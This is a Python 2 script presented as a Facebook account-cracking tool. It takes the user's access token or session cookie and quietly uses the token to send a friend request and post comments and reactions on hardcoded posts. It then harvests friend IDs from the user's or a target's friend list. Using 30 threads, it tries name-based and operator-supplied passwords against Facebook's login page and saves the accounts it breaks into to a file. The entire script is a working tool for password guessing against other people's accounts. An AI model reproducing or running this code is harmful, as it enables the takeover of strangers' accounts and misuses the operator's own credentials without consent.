#!/usr/bin/python2
# -*- coding: utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
     
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]')]
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    
def keluar():
	print ("   [!] Exit")
	os.sys.exit()
		
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
logo ="""\033[1;97m
\033[1;91m .88b  d88.  .d88b.  db   db .d8888. d888888b d8b   db
\033[1;92m 88'YbdP`88 .8P  Y8. 88   88 88'  YP   `88'   888o  88
\033[1;94m 88  88  88 88    88 88ooo88 `8bo.      88    88V8o 88
\033[1;97m 88  88  88 88    88 88~~~88   `Y8b.    88    88 V8o88
\033[1;97m 88  88  88 `8b  d8' 88   88 db   8D   .88.   88  V888
\033[1;93m YP  YP  YP  `Y88P'  YP   YP `8888Y' Y888888P VP   V8P
[\033[41;1m CREATED BY : MOHSIN ALI \033[00;1m]\033[1;97m
--------------------------------------------------
➤ \033[1;93m Coded by : MOHSIN ALI
➤ \033[1;95m Github   : https://github.com/MohsinTheLegend
➤ \033[1;94m Facebook  :MOHSIN.ALI.THE.FATHER.OF.HATERX
➤ \033[1;92m WhatsApp  :03063112***
\033[1;97m --------------------------------------------------
"""


idmem = []
idfriend = []
idfromfriend = []
back = 0
cekrek = []
threads = []
berhasil = []
emteman = []
emfromfriend = []
cekpoint = []
checkpoint = []
oks = []
id = []
auto_total = []
auto_ok = []
auto_cp = []
auto_run = []
listgrup = []
cekrek = []
vulnot = "\033[31m   Not Vuln"
vuln = "\033[32m   Vuln"

def masuk():
    os.system("clear")
    print logo
    print("\n[1] Login Access Token")
    print("[2] Login Cookie Fb")
    print("[0] Exit")
    pilih_masuk()
        
def pilih_masuk():
    sek=raw_input("\nChoose : ")
    if sek=="":
        print("Fill In The Correct")
        masuk()
    elif sek=="1":
        tokenz()
    elif sek=="2":
        cookie()
    elif sek=="0":
        keluar()
    else:
        print("Fill In The Correct")
        masuk()

def tokenz():
    os.system('clear')
    print logo
    toket = raw_input("\nToken : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print('\nLogin Successful')
        komen()
    except KeyError:
        print ("Token Invalid")
        os.system('clear')
        masuk()

def cookie():
	os.system('clear')
	print logo
	try:
		cookie = raw_input("\nCookie : ")
		data = {
		            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
			        'referer' : 'https://m.facebook.com/',
			        'host' : 'm.facebook.com',
			        'origin' : 'https://m.facebook.com',
			        'upgrade-insecure-requests' : '1',
			        'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			        'cache-control' : 'max-age=0',
			        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			        'content-type' : 'text/html; charset=utf-8',
			         'cookie' : cookie }
		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
		cari = re.search('(EAAA\w+)', coki.text)
		hasil = cari.group(1)
		zedd = open("login.txt", 'w')
		zedd.write(hasil)
		zedd.close()
		print('\nLogin Successful')
		bot_follow()
	except AttributeError:
		print ("Cookie Invalid")
		masuk()
	except UnboundLocalError:
		print ("Cookie Invalid")
		masuk()
	except requests.exceptions.SSLError:
		os.system('clear')
		print ("No Connection")
		keluar()
        
###### BOT KOMEN #######
def komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100024540287354')
	kom = ('Bnjrt Sc Nya Mantab Kali 😆')
	reac = ('LOVE')
	post = ('946670209494313')
	post2 = ('946670209494313')
	kom2 = ('Izin pakai script lu bang😆')
	reac2 = ('ANGRY')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()


			
def menu():
	os.system('clear')
	global toket
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print ("Token Invalid")
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ttl = a['birthday']
	except KeyError:
		os.system('clear')
		print ("Token Invalid")
		os.system('rm -rf login.txt')
		masuk()
	except requests.exceptions.ConnectionError:
		print ("No Connection")
		keluar()
	passchoice()
	
def passchoice():
	os.system("clear")
	print logo
	print ("")
    	print ("\n[1] Crack From Friendlist")
    	print ("[2] Crack From Public")
    	print ("[0] Log Out")
	pilih_passxd()
	
def pilih_passxd():
	peak = raw_input("\nChoose : ")
	if peak =="":
		print ("[!] Fill In The Correct")
		pilih_passxd()
	elif peak =="1" or peak =="01":
		os.system('clear')
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2" or peak =="02":
		os.system('clear')
		print logo
		idt = raw_input("\n[•] User ID Target : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "[•] Name           : "+sp["name"]
		except KeyError:
			print ("[!] Wrong ID Target")
			raw_input("\n   [ Back ]")
			menu()
		except requests.exceptions.ConnectionError:
			print ("   [!] No Connection")
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0" or peak =="00":
		os.system('rm -rf login.txt')
		keluar()
	else:
		print ("   [!] Fill In The Correct")
		passchoice()
	
        print "[•] Total ID       : "+str(len(id))
	pass4 = raw_input("\n[•] Password 1     : ")
	pass5 = raw_input("[•] Password 2     : ")
	pass6 = raw_input("[•] Password 3     : ")
	pass7 = raw_input("[•] Password 4     : ")
	pass8 = raw_input("[•] Password 5     : ")
    	print ("\n[•] Crack Started...\n")
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			tl = b['birthday']
			pass1 = b['first_name'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\x1b[0;32m[OK] '+user+' • '+pass1+' • '+tl
				oke = open('done/Indo.txt', 'a')
				oke.write('\n[OK] '+user+' • '+pass1)
				oke.close()
				oks.append(user+pass1)
			else :
				if 'checkpoint' in xo:
					print '\x1b[0;33m[CP] '+user+' • '+pass1+' • '+tl
					cek = open('done/Indo.txt', 'a')
					cek.write('\n[CP] '+user+' • '+pass1)
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'].lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\x1b[0;32m[OK] '+user+' • '+pass2+' • '+tl
						oke = open('done/Indo.txt', 'a')
						oke.write('\n[OK] '+user+' • '+pass2)
						oke.close()
						oks.append(user+pass2)
					else:
						if 'checkpoint' in xo:
							print '\x1b[0;33m[CP] '+user+' • '+pass2+' • '+tl
							cek = open('done/Indo.txt', 'a')
							cek.write('\n[CP] '+user+' • '+pass2)
							cek.close()
							cekpoint.append(user+pass2)
                        			else:
							pass3 = b['first_name'].lower()
                            				rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
                            				xo = rex.content
                            				if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                				print '\x1b[0;32m[OK] '+user+' • '+pass3+' • '+tl
                                				oke = open('done/Indo.txt', 'a')
                                				oke.write('\n[OK] '+user+' • '+pass3)
                                				oke.close()
                                				oks.append(user+pass3)
                            				else:
                                				if 'checkpoint' in xo:
                                    					print '\x1b[0;33m[CP] '+user+' • '+pass3+' • '+tl
                                    					cek = open('done/Indo.txt', 'a')
                                    					cek.write('\n[CP] '+user+' • '+pass3)
                                    					cek.close()
                                    					cekpoint.append(user+pass3)
                                				else:
                                    					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
                                    					xo = rex.content
                                    					if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        					print '\x1b[0;32m[OK] '+user+' • '+pass4+' • '+tl
                                        					oke = open('done/Indo.txt', 'a')
										oke.write('\n[OK] '+user+' • '+pass4)
                                        					oke.close()
                                        					oks.append(user+pass4)
                                    					else:
                                        					if 'checkpoint' in xo:
                                            						print '\x1b[0;33m[CP] '+user+' • '+pass4+' • '+tl
                                            						cek = open('done/Indo.txt', 'a')
                                            						cek.write('\n[CP] '+user+' • '+pass4)
                                            						cek.close()
                                            						cekpoint.append(user+pass4)
										else:
                                    							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
                                    							xo = rex.content
                                    							if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        							print '\x1b[0;32m[OK] '+user+' • '+pass5+' • '+tl
                                        							oke = open('done/Indo.txt', 'a')
												oke.write('\n[OK] '+user+' • '+pass5)
                                        							oke.close()
                                        							oks.append(user+pass5)
                                    							else:
                                        							if 'checkpoint' in xo:
                                            								print '\x1b[0;33m[CP] '+user+' • '+pass5+' • '+tl
                                            								cek = open('done/Indo.txt', 'a')
                                            								cek.write('\n[CP] '+user+' • '+pass5)
                                            								cek.close()
                                            								cekpoint.append(user+pass5)
												else:
                                    									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
                                    									xo = rex.content
                                    									if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        									print '\x1b[0;32m[OK] '+user+' • '+pass6+' • '+tl
                                        									oke = open('done/Indo.txt', 'a')
														oke.write('\n[OK] '+user+' • '+pass6)
                                        									oke.close()
                                        									oks.append(user+pass6)
                                    									else:
                                        									if 'checkpoint' in xo:
                                            										print '\x1b[0;33m[CP] '+user+' • '+pass6+' • '+tl
                                            										cek = open('done/Indo.txt', 'a')
                                            										cek.write('\n[CP] '+user+' • '+pass6)
                                            										cek.close()
                                            										cekpoint.append(user+pass6)
														else:
                                    											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass7, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
                                    											xo = rex.content
                                    											if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        											print '\x1b[0;32m[OK] '+user+' • '+pass7+' • '+tl
                                        											oke = open('done/Indo.txt', 'a')
																oke.write('\n[OK] '+user+' • '+pass7)
                                        											oke.close()
                                        											oks.append(user+pass7)
                                    											else:
                                        											if 'checkpoint' in xo:
                                            												print '\x1b[0;33m[CP] '+user+' • '+pass7+' • '+tl
                                            												cek = open('done/Indo.txt', 'a')
                                            												cek.write('\n[CP] '+user+' • '+pass7)
                                            												cek.close()
                                            												cekpoint.append(user+pass7)
																else:
                                    													rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass8, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
                                    													xo = rex.content
                                    													if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        													print '\x1b[0;32m[OK] '+user+' • '+pass8+' • '+tl
                                        													oke = open('done/Indo.txt', 'a')
																		oke.write('\n[OK] '+user+' • '+pass8)
                                        													oke.close()
                                        													oks.append(user+pass8)
                                    													else:
                                        													if 'checkpoint' in xo:
                                            														print '\x1b[0;33m[CP] '+user+' • '+pass8+' • '+tl
                                            														cek = open('done/Indo.txt', 'a')
                                            														cek.write('\n[CP] '+user+' • '+pass8)
                                            														cek.close()
                                            														cekpoint.append(user+pass8)
        	except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print ("\n\x1b[0;37m[•] Crack Finished")
	print "[•] Total OK/CP: "+str(len(oks))+"/"+str(len(cekpoint))
	print ("[•] File Saved At : done/Indo.txt")
	raw_input("[ Back ]")
	menu()
			
if __name__ == '__main__':
	menu() 
